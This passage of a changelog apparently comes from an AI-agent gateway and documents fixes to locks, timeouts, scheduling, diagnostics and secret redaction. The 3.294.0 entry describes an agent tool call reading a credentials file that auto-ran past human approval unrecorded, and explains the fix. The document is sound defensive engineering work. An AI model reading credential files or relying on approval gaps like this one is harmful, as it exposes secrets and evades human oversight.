  still added two entries (`live-e2e:live.commit_gate`,
  `enforcement:a.bundle_navigate_hook`) to the live alert history on the next
  suite run. `send()` persists on every path — including the `no_targets` skip
  those tests assert — so asserting a skip is enough to write the file. That
  test now isolates, and `test/alerter-test-isolation.test.mjs` pins the rule:
  an inline alerter config in `test/` must name `paths.configDir` or
  `alerting.statePath`, unless it carries `alerter-home-fallback-ok` (the
  deliberate opt-out that pins the home default). The check verifies itself in
  both directions — which is how a bug in its own matcher (`alerts?:` never
  matches the real key `alerting:`) was caught before it shipped as a check
  that could never fail.

## 3.296.0 (2026-08-28)

- The self-deploy watcher's config reload is gated on an ACTIONABLE intent, not
  on the intent file existing. Nothing ever deletes a resolved intent: the live
  box has carried a `rolled_back` fire-drill intent since 2026-08-14, so the
  3.295.0 gate would have been satisfied on every tick forever — `loadConfig()`
  every 5s, ~17k config banners a day in the deployer log. Caught by reading
  the live file before restarting the watcher on 3.295.0; it never shipped to
  the live process.
- `isActionableIntent` is now one exported predicate used by both the watcher
  and `runDeployOnce`, which had the same rule spelled out inline. A predicate
  duplicated between a reader and a writer is where these two drift.

## 3.295.0 (2026-08-28)

- The self-deploy watcher re-reads config before it acts. `xclaw self-deploy
  watch` is the one xclaw process that outlives every config edit: the gateway
  restarts constantly (365 restarts on the live box), the watcher is started
  once by the supervisor and then runs for weeks — 14 days, live, at the time
  of writing. It called `loadConfig()` once in the CLI and every decision it
  made afterwards used that snapshot.
- A target added to `xclaw.json` after that boot therefore never reaches the
  watcher's alerter, which stays target-less for its whole life. Losing
  `deploying`/`deployed` (severity info) costs nothing, but `rolled_back`
  and `ROLLBACK FAILED` are severity `error`, and the `no_targets` check in
  `send()` sits ABOVE the severity check — so the one alert that says the
  machine failed to redeploy itself and needs a human goes nowhere either.
  Proven by driving a real `xclaw self-deploy watch` out-of-process under an
  isolated HOME: with the reload, both alerts recorded `skipped: null` against
  a target added after boot; with it disabled, the same drive recorded
  `severity=error skipped="no_targets" results=[]`.
- `getSharedAlerter` already carries an upgrade-in-place repair for a frozen
  target-less alerter, but it can only fire when a caller hands it a config
  that DOES resolve targets. A caller that never re-reads config can never
  trigger the repair built for it.
- Re-reading is gated on a pending intent, because `loadConfig()` logs on
  every call and the watch loop ticks every 5s.

## 3.294.0 (2026-08-28)

- `security.safeAuto` no longer outranks the critical risk tier. safeAuto is a
  list of tool NAMES; risk is assessed per CALL, and those are not the same
  question. `file_read` is a read-safe family — which is why it ships in the
  default list and in the prod overlay — but `file_read ~/.xclaw/credentials.json`
  is the most direct exfiltration path there is, and `assessRisk` already tiers
  it critical for exactly that reason ("touches credential/secret material").
  The name matched first, so the verdict was thrown away: the read auto-ran, no
  human saw it, and because the decision journal only records the bypass path,
  nothing recorded that it had happened.
- The asymmetry was the tell. Every other permissive path in `needsApproval`
  deliberately stops short of critical — `bypassApprovals` (Trust Sprint),
  blanket `autoApprove` (A2) and `autoApproveMaxTier: "critical"` (M5) each
  escalate, each with a comment saying so. safeAuto was the one path that did
  not, in both of its occurrences: the risk-tier branch and the legacy
  `approvalPolicy` branch below it. The prod and supervised overlays ship a
  safeAuto list and no `autoApproveMaxTier`, so the live config went through
  the second one. `approvalPolicy: "never"` had the same gap, reachable only
  from a hand-written config — every shipped profile pairs it with
  `autoApprove`, which escalates.
- The fix is one hoisted check rather than three patched branches, so the
  guarantee now holds regardless of which path below would have allowed the
  call. `criticalOverride: "legacy"` still restores the old behaviour for all
  of them, as it does for every other path.
- Sweep #41 pinned the CONTENTS of the prod safeAuto list and even documented
  the mechanism as "an unconditional auto-approve short-circuit" — but which
  names are listed says nothing about what a listed name does at critical tier,
  so the control flow itself was never asserted. `test/safeauto-critical.test.mjs`
  (16 tests) pins the mechanism in both config shapes, mutation-verified in
  both directions, and keeps the escape hatch, the degraded `risk === null`
  path and ordinary safeAuto reads pinned alongside it. `docs/APPROVALS.md`
  carried a five-step decision order that had been stale for several releases;
  it now matches the code.

## 3.293.0 (2026-08-28)

- The Telegram writer lock now reads the `host` it has always written. The lock
  payload has carried `host: os.hostname()` since it existed, and nothing ever
  looked at it — deleting the field left the whole lock suite green, which is
  what a write-only field looks like. Meanwhile the holder's pid went straight
  to `isPidAlive`, which asks *this* machine's process table. That is only an
  answer for a pid this machine minted.
- Where `~/.xclaw` is not private to one host — a bind-mounted volume whose
  container is recreated with a new hostname, a restored home, an NFS home —
  that fails open in both directions. Host B reads host A's fresh lock, looks
  A's pid up locally, finds nothing and takes the lock: two processes on
  `getUpdates` for one bot token, the precise failure the lock exists to
  prevent. The mirror case is a local process coincidentally wearing that pid,
  which makes B defer forever to a holder that no longer exists — a silent
  intake outage.
- `isSameHost` (in `shared/pid-alive.mjs`, beside the liveness primitives so
  reader and writer cannot drift) gates the pid check on provenance. A remote
  holder is judged only by its renewal stamp, which `runTelegramPollLoop`
  refreshes every poll iteration: fresh means held (`lock_held_remote`), stale
  means reclaimable, so a dead host still cannot wedge intake. A pid number is
  not evidence off its own host either, so the self-reacquire clause is
  local-only. A lock with no `host` predates the field and cannot be proven
  remote, so it keeps exactly its existing pid-driven behaviour.
- `xclaw doctor` stops claiming liveness it cannot test. It already had the
  holder's host in hand — it printed it — and still reported `held by live
  pid=N` about a process on another machine, and `holder pid=N is gone` when a
  local table lacked that number. It now reports a remote owner as
  `pid=N on another host (…)`, warns on a stale remote stamp without asserting
  the process exited, and leaves single-host output byte-identical.
- `test/telegram-writer-lock-host.test.mjs` (15 tests) covers the primitive
  (case-insensitivity, the six shapes of a missing host), the acquisition path
  (a fresh remote lock is not stolen and its bytes survive, a stale one is
  reclaimable, a colliding pid is still remote, all four same-host combinations
  unchanged, legacy locks judged by pid in both directions) and the doctor's
  wording. Both wirings were mutation-verified in both directions.
## 3.292.0 (2026-08-28)

- The five Telegram media-upload requests are bounded. v3.290.0 fixed the JSON
  `api()` path — Node's `fetch` has no total-request timeout, so a socket that
  opens and then goes silent parks the awaiting caller forever — and explicitly
  deferred the multipart paths. Those were the worse case: `sendPhotoUrl`,
  `sendPhotoFile`, both `sendAsDocument` helpers and `sendVoice` each awaited a
  `fetch` with no signal, so one silent socket held the whole reply turn with
  nothing to time it out and nothing to report it.
- Uploads cannot share `api()`'s flat budget, so the new
  `telegramUploadTimeoutMs(bytes)` derives one from the payload: a 30s
  allowance for connect, TLS and Telegram's own post-upload processing, plus
  wire time at a deliberately pessimistic 128 KiB/s, clamped to 10 minutes. The
  clamp is what restores the guarantee — no size, however absurd or
  miscomputed, can make the request unbounded again — and the ceiling still
  leaves room for Telegram's own 50 MB document limit at the assumed rate, so a
  legitimately large upload never aborts itself. A flat 30s would have cut off
  every multi-megabyte generated image on a slow link, trading a hang for a
  silent delivery failure.
- `sendPhotoFile` no longer routes an abort into its document fallback. That
  `catch` treated every error as "Telegram refused this format" and re-uploaded
  the identical buffer — so a wedged socket became two, and the second one had
  the same reason to wedge as the first. A timeout is now reported; a genuine
  rejection still falls back, and the fallback carries the same budget.
- Voice-out keeps its throwing contract (its caller warns and records a
  `voice_out` channel error) but names the timeout, which `AbortSignal` would
  otherwise surface as an opaque "The operation was aborted".
- `test/telegram-upload-timeout.test.mjs` (10 tests) covers the budget's
  monotonicity, its clamp, and its garbage-input floor, then drives all three
  send functions against a server that accepts and never answers: without a
  signal each call never settles, which the test reports as HUNG rather than
  hanging the suite. It also pins the invariant at the source — every `fetch(`
  in photo-out and voice-out must carry a `signal:`. All three wirings were
  mutation-verified in both directions, including the fallback branch.
## 3.291.0 (2026-08-28)

- Every process-liveness check now routes through the one primitive in
  `src/shared/pid-alive.mjs`. A fresh census found **seven** implementations of
  "is this pid alive?" across `src/` and `bin/`, five of them written as
  `try { process.kill(pid, 0); return true } catch { return false }`. That bare
  catch is wrong: `kill(pid, 0)` throws `ESRCH` when the process is gone but
  `EPERM` when it *exists and belongs to another uid*. Collapsing both into
  "dead" fails OPEN, and four of the five guarded a lock.
- The severe cases were the locks. `acquireGatewayLock` (`src/gateway/run-loop.mjs`)
  reading a live holder as gone puts two gateways on one port and one state
  directory. `acquireTelegramWriterLock` (`src/channels/telegram/webhook.mjs`)
  doing so puts two processes on `getUpdates` for one bot token, and Telegram
  then hands each a partial, racing view — messages duplicate or vanish, the
  exact failure the single-writer lock exists to prevent. The Chrome profile
  lock (`src/browser/horizon0.mjs`, whose control flow lived inside the catch)
  and the fabric lock (`src/browser/fabric-lock.mjs`) round out the set; dual
  Chrome on one profile corrupts its disk state.
- The Telegram case was also a reader/writer severity mismatch. v3.289.0 gave
  the *doctor* EPERM-correct semantics, but acquisition kept its own inline
  copy — so the doctor would report `held by live pid=N` while the writer stole
  that same lock. `src/cli/doctor-telegram-writer.mjs` now re-exports the shared
  primitive instead of defining its own.
- Two non-lock sites are corrected too: `src/computer/manager.mjs` and
  `src/browser/mitm.mjs` supervise child processes, and `bin/xclaw.mjs`
  `supervisor status` reported a running-but-unsignalable supervisor to the
  operator as `alive: false`.
- Zombies cut the other way and were the only *live-visible* behaviour change
  here, since a single-uid deployment never produces EPERM. A defunct process
  still answers `kill(pid, 0)` successfully, so every bare-catch copy called it
  alive — fail-CLOSED. The canonical primitive already reads `/proc/<pid>/status`
  for `State: Z`, so `manager.mjs` now replaces a defunct computer server
  instead of waiting out `staleMs`, skips a pointless SIGKILL to a zombie, and
  the wait-for-exit loops in `manager.mjs` and `mitm.mjs` exit as soon as the
  process actually has.
- `isPidAlive`/`isPidDefinitelyDead` gained an injectable `kill` parameter, and
  the two lock acquirers an `opts.isAlive` seam, because EPERM cannot be
  provoked under a single-uid deployment — as root every process is signalable.
  `test/pid-alive-single-source.test.mjs` (18 tests) drives the semantics
  directly, asserts both locks refuse to steal from an EPERM holder *and* leave
  the holder's pid in the lock file, and pins the invariant at the source: no
  file under `src/` or `bin/` may call `process.kill(pid, 0)` or define its own
  `isPidAlive`/`pidAlive`. Both lock fixes were mutation-verified in both
  directions.
- Out of scope: `src/computer/xclaw-server.mjs` is the tracked vendored bundle,
  patched wholesale per ADR 0006 and never line-edited.

## 3.290.0 (2026-08-28)

- Every Telegram Bot API request now carries a client-side deadline. Node's
  `fetch` has no total-request timeout, so `api()` was unbounded: a half-open
  socket — the shape a NAT drop or a dead route produces, distinct from a
  reset, which errors immediately — parked the awaiting caller forever.
- On `getUpdates` that was worse than a visible outage, because nothing could
  see it. The poll loop suspends *inside* the request, so during a hang it
  stamps neither `lastPollOkAt` nor `lastPollErrorAt` and never increments
  `consecutivePollFails`. Both arms of `detectPollOutage` need an emitted poll
  error — `fails >= pollFailThreshold`, or `errAt > okAt && now - okAt >
  outageAfterMs` — and a hang emits none, so the first arm never counts and the
  second can never see an error newer than the last success. `loopAlive` stays
  true because the loop is suspended, not stopped, so the channel watchdog read
  a wedged poller as healthy and took its `continue` branch: no restart, no
  alert. Intake stopped and the gateway reported itself fine.
- The fix is one `AbortSignal.timeout()` on the fetch, budgeted by a new pure
  `telegramRequestTimeoutMs(method, body, opts)` in
  `src/channels/telegram/errors.mjs`. No classifier change was needed: an abort
  rejects with "The operation was aborted due to timeout", which
  `classifyTelegramError`'s first branch (`/abor|ETIMEDOUT|timeout/i`) already
  grades `TIMEOUT` and retryable. That converts the silent hang into exactly
  the error the existing machinery consumes — `lastPollErrorAt`,
  `consecutivePollFails`, `backoffMsFromClassification` — so the watchdog it
  was blind to now fires on its normal path rather than through a new one.
- The budget derives from the request's own long-poll window (`body.timeout`),
  not from a list of method names. Telegram holds the connection for `timeout`
  seconds when a request asks it to, so such a request is expected to be slow
  by exactly that much and everything else is expected to be prompt.
  `getUpdates` is the only method that sends the field today; a future one gets
  the right budget without editing the function. Defaults: 30s base, and the
  long-poll window plus a 15s margin (so the live 30s poll gets 45s, and the
  50s clamp in `poll-loop.mjs` maxes it at 65s). The margin covers connect, the
  server's reply latency after the window closes, and clock slop, so an idle
  long poll never aborts itself on every cycle.
- New optional config `channels.telegram.requestTimeoutMs` and
  `channels.telegram.longPollMarginMs` are operator escape hatches for a slow
  self-hosted Bot API server. Both are floor-clamped to 1s: a sub-second budget
  on a real network is a self-inflicted outage.
- Not covered on purpose: the five media-upload fetches in
  `src/channels/telegram/photo-out.mjs` and `voice-out.mjs` remain unbounded. A
  large upload on a slow link is legitimately slow, and a cap picked without
  sizing evidence would turn a slow success into a regression. They are a
  separate change needing a size-derived budget — this release does not make
  every Telegram call bounded, only every `api()` call.
- `test/telegram-request-timeout.test.mjs` covers the budget function's
  branches and clamps, pins the `api()` wiring and the `getUpdates` body field
  at the source (the poll loop can't be driven in-process), and proves the fix
  end-to-end against a real `net.createServer` that accepts the connection and
  never answers: the request aborts and classifies `TIMEOUT`/retryable instead
  of hanging.

## 3.289.0 (2026-08-28)

- `xclaw doctor` reported `[OK] telegram.writerLock: lock present` for a lock
  whose holder had died, and `[OK] telegram.runtime: running=false …` in every
  state including a healthy one. Both now report on the live writer.
- `telegram.runtime` built its own `createChannelManager(cfg)` and printed that
  manager's `running` field. `running` is `enabled && loopAlive && !stopped`,
  and `loopAlive` is a closure-local flag set only when *that* process starts
  the poll loop, so in a CLI process it is unconditionally false. The line read
  identically whether Telegram was healthy, wedged, or unconfigured. That was
  diagnosed on 2026-08-24 alongside 3.176.1 and written into the session notes
  as a caveat — "use the gateway's /doctor route for truth" — instead of being
  removed, so a probe already known to be meaningless kept printing `[OK]`.
- `telegram.writerLock` read the lock, computed the holder's pid and the stamp's
  age, then reported `ok` without judging either; its own comment said it "does
  not prove ownership". A lock left behind by a crashed writer read as healthy.
- Both now derive from the single-writer lock, the only Telegram runtime signal
  a separate process can honestly read: the writer takes
  `~/.xclaw/locks/telegram-writer.lock` before starting and touches it at the
  top of every poll iteration, so a healthy stamp is at most one long-poll
  (30s) old. The predicate is `acquireTelegramWriterLock`'s own — a holder whose
  pid is gone, or a stamp older than its 120s `staleMs`, is exactly what that
  function treats as reclaimable. Doctor warns there now instead of passing.
- Three outages the old probes passed, each driven end-to-end through the real
  CLI: holder pid gone (`stale lock: holder pid=… is gone`), holder alive but no
  longer renewing (`not renewed for 601s (>= 120s) — poll loop wedged`, the
  shape a pid check alone misses), and no lock at all while Telegram is
  configured (`no process owns Telegram updates`). On this host, which is
  healthy, the line is now `held by live pid=3959028 … renewed 21s ago`, and the
  warning count is unchanged at 13.
- Two smaller corrections rode along. The probe honours
  `channels.telegram.writerLockPath`, so a configured lock path is no longer
  ignored — the old probe checked the default path and reported its absence as
  OK. And pid liveness treats `EPERM` as alive, since only `ESRCH` proves a
  process is gone; `acquireTelegramWriterLock` still reads `EPERM` as dead,
  left alone here because changing it changes when a lock may be stolen.
- The decision lives in `src/cli/doctor-telegram-writer.mjs` as a pure function
  over evidence the caller reads, because `runDoctor` calls `loadConfig()` and
  live HTTP and cannot be driven from a unit test.
  `test/doctor-telegram-writer.test.mjs` covers every branch and was
  mutation-verified both ways: reporting a dead holder as `ok`, and treating
  `EPERM` as dead, each turned it RED.
- Deleted with it: the `createChannelManager` call in the CLI probe, which
  constructed four channel objects to print a constant, and the
  `telegram.lastError` branch that could only fire on a manager never started.

## 3.288.0 (2026-08-28)

- `xclaw doctor` ran six of its probes two or three times per invocation and
  printed each verdict once per run. Found by live-driving the gateway after
  3.287.0: `ops.auth_refresh` — the probe that release had just repaired —
  printed its warning twice, byte-identical.
- Cause is duplicated call sites in `runDoctor`. The ops probes had been grouped
  into `doctor-ops-bundle.mjs`, but the inline calls they replaced were never
  removed, so `runDoctor` invoked the bundle and then re-invoked four of the
  bundle's own probes below it — auth-refresh, receipt-metrics, smoke-compare
  and stop-route — with identical arguments. Separately `pushPerfChecks` ran
  three times: once inside `pushPerfChecksEnsured`, which calls it, and twice
  more directly from two byte-identical blocks.
- Not only cosmetic. Doctor reports a warning count and exits on it, so sixteen
  warnings overstated thirteen distinct findings, and an operator counting them
  across runs saw movement that was not there. The repeats also did the work
  again: `ops.cold_start` made three live health requests per doctor run.
- Deleted the six redundant call sites; `doctor-ops-bundle.mjs` is now the
  single owner of its probes and `pushPerfChecksEnsured` the single caller of
  `pushPerfChecks`. Net 42 lines removed, no probe lost.
- Correction to this entry, made after publishing it: it first claimed
  `gateway.stopRoute` was duplicated but "emitted nothing on this host". That
  was wrong, and asserted without checking. Re-running the pre-change file
  (sha256 `2e3c22eb…`) against this host shows all six probes duplicated in the
  visible output — `ops.cold_start` and `eval.flake_budget` three times each,
  `ops.auth_refresh`, `ops.receipt_metrics`, `ops.smoke_compare` and
  `gateway.stopRoute` twice each — and the summary line moving 16 warnings to
  13. The counts above are the corrected ones.
- The regression test reads the probe call graph out of the source and walks one
  hop past each shim, so it catches a duplicate whether or not it happens to
  emit on the host running it. That property is the reason for the approach; it
  is not what happened here, where every duplicate was visible.
- Removed `patches/doctor-receipt-metrics.patch` and its entries in the batch-3
  and production land manifests. That patch wired the probe inline into
  `doctor.mjs` before the bundle existed; batch-4's `doctor-ops-bundle.patch`
  superseded it, and the manifests decide "already landed" by grepping the
  target file for the probe name — so deleting the inline duplicate made the
  needle false and the harness tried to re-apply a patch whose context is gone.
  The guarantee the needle gave is now asserted directly: the regression test
  names the four probes the manifests used to guard and checks the bundle still
  invokes each one.

## 3.287.0 (2026-08-28)

- The `ops.auth_refresh` doctor probe has never run in production. Its shim,
  `src/cli/doctor-auth-refresh.mjs`, was `export { pushAuthRefreshChecks } from
  "..."` followed by `export default { pushAuthRefreshChecks }` — a re-export
  creates no local binding, so naming it again threw `ReferenceError` at module
  evaluation. Both call sites (`doctor.mjs`, `doctor-ops-bundle.mjs`) import the
  shim dynamically inside a `try/catch` whose handler is
  `push("ops.auth_refresh", "warn", e.message)`, so the crash was laundered into
  a health result. Live on the gateway it printed
  `[WARN] ops.auth_refresh: pushAuthRefreshChecks is not defined`, twice, in a
  wall of sixteen warnings.
- This is a fail-open, not cosmetics: the probe's own failure branch pushes
  `error`, and doctor's exit code counts errors. A genuine auth failure would
  have been reported as a mild warning and exited 0.
- Fixing the shim alone would have shipped a FALSE production error, so the
  reader is fixed in the same release. `pushAuthRefreshChecks` escalated any
  `failed.length` to `error` while ignoring the `soft` flag its own writer sets.
  `cost-preflight-auth` defines `soft: !anyOk && !hardFail`, and `hardFail`
  requires `opts.requireAuth === true` — so `soft: true` means "the refresh
  failed, but the caller never required auth", non-fatal by construction. The
  live status file says exactly that: `ok: true, soft: true`, both apps
  `no_token`. A host running on API keys has no OAuth token to refresh and
  records that on every single preflight, so the unmasked probe would have
  reported a permanent false failure. It now warns, escalating in prod/strict
  like the missing-status and skipped branches already do, and names the failing
  apps and codes so the warning is actionable.
- The existing 80 lines of auth-refresh tests could not have caught either half:
  they import `src/tokens/auth-refresh-status.mjs` directly, which is the module
  the broken shim re-exported and production never reached, and none of them
  exercised a failed result at all. The regression test pins the shims
  themselves — all 30, enumerated from disk rather than listed, so the next shim
  added is covered without anyone remembering to add it.

## 3.286.0 (2026-08-28)

- 3.285.0 closed only half of its own defect. Anchoring to the last run lets a
  restart RESUME a schedule; it cannot START one. A job that has never run has
  no stamp to anchor to, so `nextRunFor` falls through to `now + everyMs` at
  every boot, and a host that restarts more often than the interval recomputes
  the same distant first run forever. That is the original bug, untouched, for
  exactly the jobs that had never run.
- MEASURED ON THE HOST after 3.285.0 was live, not inferred: `ops-schedule.json`
  holds one key, `lastRun`, with two entries — `ops.maintenance` (73.7m old) and
  `cron.approvalDigest` (3.7m old). `cron.doctor` and `cron.evalSuite` are
  absent. Gateway uptime 15.1 minutes, 355 restarts. Only the five-minute digest
  is short enough to reach its first run inside one process lifetime; the hourly
  doctor and the daily eval suite were still in the pre-3.285.0 state, which is
  why the eval-suite claim in that entry was premature.
- Fix is a second durable epoch, `armed`, in the same file: the moment a job's
  clock STARTED. `nextRunFor` counts from `lastRun ?? armed`, so a never-run job
  still waits its full interval before firing — a fresh install must not launch
  an hour-long suite while it is booting — but that interval is now measured
  from a stamp that survives restarts instead of resetting at each one.
- Kept separate from `lastRun` rather than seeding it. Seeding would be one
  fewer field and would make `doctor` report a run that never happened, which is
  precisely the confusion the `eval.cron` / `eval.cron.lastRun` split was added
  to prevent last release. `dueJobStatus` and `readDueStateSync` are deliberately
  blind to `armed`, and a test pins that.
- First arm wins. Re-arming at each boot would reset the clock and restore the
  bug this exists to fix, so the guard and the write share one serialized turn on
  the file's existing write chain. `markRan` now carries the `armed` map forward
  — it rewrites the whole file, and dropping the map would re-arm everything at
  the next boot. Both hazards are mutation-verified: removing the guard, ignoring
  the arm epoch, and dropping the map each turn the suite red on a distinct test.
- Anchoring still requires a cfg, unchanged from 3.285.0, so a bare-registered
  job cannot write into the running gateway's stamp file — which also makes the
  guard unreachable through the scheduler, so it is tested against the primitive
  directly.
- `doctor` said "never run yet (runs shortly after next gateway boot)", which
  was true of the boot-catch-up jobs it was written for and false the moment an
  anchored job adopted it: an anchored job waits a full interval. It now
  distinguishes three states — catches up after boot, armed with a countdown
  ("armed 1.5h ago, first run in 22.5h"), and anchored but not yet armed. The
  wording moved to `src/cli/doctor-schedule.mjs` to get there: the probes sit
  inside `runDoctor`, which loads the real config and cannot be aimed at a
  fixture, so they shipped last release with no test. The decision is now pure
  and pinned; the config plumbing stays where it was.
## 3.285.0 (2026-08-28)

- CORRECTION TO 3.284.0: that entry closed the uptime-fail-open class on the
  strength of a census that was literal on `setInterval`, and the biggest
  instance does not use one. The cron scheduler re-registers every
  handler-based job at boot — `isPersistable` requires a payload, so no
  maintenance cron is ever persisted — and `computeNextRun({kind:"every"})`
  returns `now + everyMs`. A job therefore only reaches its first run if a
  single process survives the whole interval. The class was not closed; it
  was one layer down, and unlike the digest it was already live.
- MEASURED ON THE HOST, not inferred: `gateway.log` holds 339
  `Gateway listening` boots and 339 eval-cron registrations against 8
  eval-cron lines. The daily eval regression suite last STARTED 2026-08-23
  and last COMPLETED 2026-08-17 — six starts in thirteen days. Median
  inter-boot gap over the last forty boots is 24 minutes; a daily cron needs
  1440. Two symptoms compound: it rarely arms long enough to fire, and the
  ~54-minute suite is usually killed mid-run when it does. `jobs.sqlite`
  holds zero rows, confirming the non-persistence half.
- Fix is an opt-in `anchorKey` on the scheduler itself. Anchored jobs compute
  `nextRunAt` from a durable stamp (`stamp + everyMs`, floored 60s past boot
  so a catch-up lands after startup rather than during it); everything else
  keeps the current relative behavior. Opt-in is the point, not a hedge: no
  catch-up is CORRECT for user payload jobs — a restart must not burst the
  messages it missed while down — so only the three maintenance crons
  (`cron.evalSuite`, `cron.doctor`, `cron.approvalDigest`) anchor. Anchoring
  also requires a cfg: without one there is no durable home to trust, and a
  job registered bare must not write into the running gateway's stamp file.
- The stamp is written at ATTEMPT, not completion. Completion-stamping never
  stamps at all here — the suite outlives the median uptime — so it would
  relaunch a 54-minute job at every boot: a restart storm dressed as a fix.
  At-most-once-per-interval is the guarantee a maintenance job wants; the
  trade, stated plainly, is that an interrupted run waits out its interval.
  A failing run stamps too, so a broken cron cannot retry forever.
- `eval-job.mjs` passed `_cfg` where `addJob` reads `cfg`, so the eval cron
  has always run with a null config — its events went to the default log
  path and it could not have anchored. Fixed; `intervalMs` is now passed
  alongside `schedule` for the same reason.
- The digest schedule added an hour ago in 3.284.0 is REMOVED, not kept:
  once the scheduler anchors, a parallel `setInterval` in
  `approval-digest.mjs` is a second arming site for the same job and would
  have produced double digests the moment `digestIntervalMs` was set. Its
  `runDueDigest` / `startApprovalDigestSchedule` / `DIGEST_JOB` are deleted
  (115 → 60 lines) and the gateway's duplicate call with them. One obvious
  implementation; the cron scheduler is it.
- `doctor` gains `eval.cron.lastRun` beside the existing `security.digest`,
  both reading the cron anchor keys. The existing `eval.cron` probe is kept
  and left alone precisely because it is the counter-example: it reports
  that the job is REGISTERED, which was true at all 339 boots and green the
  entire time the suite was not running. Registration and freshness are
  different facts and now have different probes. Sub-hour intervals also
  rendered as "0h" — a five-minute digest reported as zero — so ages and
  intervals format in minutes below an hour.

## 3.284.0 (2026-08-28)

- SAME FAIL-OPEN, ONE FILE OVER: a fresh literal census of every
  `setInterval` in `src/` for the v3.283.0 defect shape found exactly one
  more instance — the approval digest, armed by the gateway as a bare
  `setInterval(sendApprovalDigest, cfg.security.digestIntervalMs)` with no
  boot run and no durable stamp. The natural setting for that feature is a
  daily digest and the live host redeploys several times a day, so an
  operator who enabled it would have received zero digests, forever, with
  nothing in the logs to say so — a digest that is not sent is invisible.
  Latent rather than active when found (`security.digestIntervalMs` is
  unset live), so this is a fix ahead of the outage rather than after it.
  New `runDueDigest` / `startApprovalDigestSchedule` in
  `src/security/approval-digest.mjs` schedule it against the same persisted
  stamp the ops job uses; `send` is injectable in the spirit of the existing
  `deliver` seam, so the schedule is testable without standing up the shared
  approval gate (whose singleton upgrades its frozen policy in place and
  arms an SLA timer).
- The rest of the census came back clean, and that is the useful half of the
  result: `auth/key-rotation-scheduler.mjs` (60s check interval +
  `runImmediately` boot run + "rotate if due") and
  `connected/refresh-scheduler.mjs` (15min + a 5s boot `setTimeout`) already
  implement the correct pattern. Every remaining timer is a seconds-scale
  heartbeat, typing indicator, watchdog, or WAL checkpoint whose value
  exists only while the process is alive, and is therefore legitimately
  uptime-scoped. The class is now closed.
- `startPeriodic` extracted into `src/ops/due.mjs` as the shared timer
  primitive, so the property that actually fixes this bug — an overdue
  catch-up shortly after boot, not just an interval — is carried by the
  primitive rather than re-implemented per caller. It owns timers only;
  the caller's `tick` owns due-ness and stamping. `startOpsSchedule` moves
  onto it with no behavior change (net -5 lines).
- `markRan` is now serialized through a promise chain. All jobs share one
  stamp file, so the moment a SECOND job adopted the primitive a concurrent
  read-modify-write could drop a stamp — and a job whose stamp keeps getting
  dropped re-runs at every boot, which is the hot loop the stamp exists to
  prevent. The two boot delays are also staggered (ops 60s, digest 90s).
- `doctor` gains `security.digest`, and both schedule probes now share one
  `dueJobStatus` helper: never-run is reported as fine (the boot catch-up
  will take it), past twice the interval warns. Shipping the detector with
  the fix is the point — the v3.283.0 outage lasted six days precisely
  because nothing reported a job that was not running.
- 8 new tests (3899 total, 0 failures), each mutation-verified in both
  directions: removing the boot catch-up turns both schedule suites RED,
  unserializing `markRan` drops the ops stamp, and stamping only on success
  makes a permanently-failing digest retry at every boot.

## 3.283.0 (2026-08-28)

- LIVE FAIL-OPEN FIX (found by observation, not by census): the daily ops
  job — stale-tmp sweep, cost-ledger compaction, and JSONL rotation of
  router-events / cost-ledger / cron logs — had not run on the live host
  since 2026-08-22. The gateway armed it as a bare
  `setInterval(job, 24h)` at boot, which only ever fires if ONE process
  instance survives 24 uninterrupted hours; a host that redeploys daily
  therefore performs maintenance NEVER, and silently, because nothing
  logs a run that did not happen. Live evidence: 337 gateway boots in
  `gateway.log` against 5 sweeps total (last 2026-08-22), 350 pm2
  restarts, and `doctor` reporting `ops.tmp: 83671 stale xclaw tmp
  entries`. The sweeper itself was never broken — it was simply never
  called. New `src/ops/due.mjs` (persisted last-run stamps in
  `ops-schedule.json`, 0o600, durable atomic write; due when never run,
  when the interval has elapsed, or when the clock moved back) and
  `src/ops/scheduler.mjs` (`startOpsSchedule`: overdue catch-up 60s after
  boot, then the steady interval; each run stamped even on partial
  failure so a broken job cannot hot-loop at every boot). A restart now
  RESUMES the schedule instead of resetting it. The gateway's 27 inline
  timer lines collapse to 7. Scheduling had zero test coverage before
  this; `test/ops-schedule-restart.test.mjs` pins it, mutation-verified
  in both directions (removing the boot catch-up and no-op'ing the stamp
  each turn the suite RED).
- OBSERVABILITY (the same defect's other half): `doctor` gains an
  `ops.schedule` probe reporting how long ago the daily ops job actually
  ran, warning past 2x the interval. The outage was invisible for six
  days because a job that never runs logs nothing, so silence read as
  health; overdue is now a reported state.

## 3.282.0 (2026-08-28)

- SECURITY HARDENING (mutation sweep #73, RULE(o) on the provider
  plane): model-discovery URLs can embed the API key (Google Gemini
  `/models?key=...`) and `fetchLiveModels` surfaced that URL VERBATIM —
  persisted into the on-disk model cache, returned to doctor's
  `providers.liveCheck`, and served by provider routes. New
  `src/utils/redact-url.mjs` (`redactUrlSecrets` — strips
  key/api_key/token/access_token/secret query values and proxy
  `user:pass@` userinfo) applied at all four egress sites: the cache
  payload, the success return, the stale-cache read (old cache files may
  already hold keys), and the failure return. The request itself keeps
  the real key — redaction is egress-only, pinned end to end (a failed
  google discovery surfaces `<redacted>`, never the key, and no cache
  file may contain it). Mutation-verified both directions. Also corrects
  the #61 census verdict: the google model-cache file COULD hold a
  credential, so its 0o600 mode was load-bearing after all — now the key
  never reaches the file at any mode.

## 3.281.0 (2026-08-27)

- SECURITY HARDENING (mutation sweep #71): the Telegram bot token could
  reach error/log egress. API URLs embed the token (`/bot<token>/...`)
  and a runtime error can echo the full URL — REPRODUCED: fetch's
  "Failed to parse URL from <url>" carries it, so a misconfigured API
  base would leak the live credential into pm2 logs on every poll, and
  the media-download failure path would place it in AGENT-VISIBLE text.
  New pure `redactTelegramToken` (errors.mjs) applied at the three
  egress boundaries: api()'s network-error wrap, the media-download
  retry warn, and the media-failure text handed to the agent. The
  end-to-end repro is pinned (a bad API base must surface `<token>`,
  never the credential). Mutation-verified both directions
  (identity-redactor and unredacted-boundary each RED).

## 3.280.0 (2026-08-27)

- COVERAGE PIN (mutation sweep #70, RULE(n)): the Telegram poll backoff
  BOUNDS were pinned by NO test — the existing retry_after case (12s)
  lands inside every bound, so removing the 60s ceiling left the FULL
  suite green (3877/0): a flood-control `retry_after: 3600` from
  Telegram would sleep the live poll for an hour. All three bounds now
  fire alone: huge retry_after caps at 60s, zero retry_after floors at
  500ms (never busy-spin), and the exponential path caps at 30s+jitter.
  The poll-loop's fatal-stop on UNAUTHORIZED was probed too and is
  already covered (mutant RED — ship nothing there). Mutation-verified
  three ways. Shipping code byte-identical.

## 3.279.0 (2026-08-27)

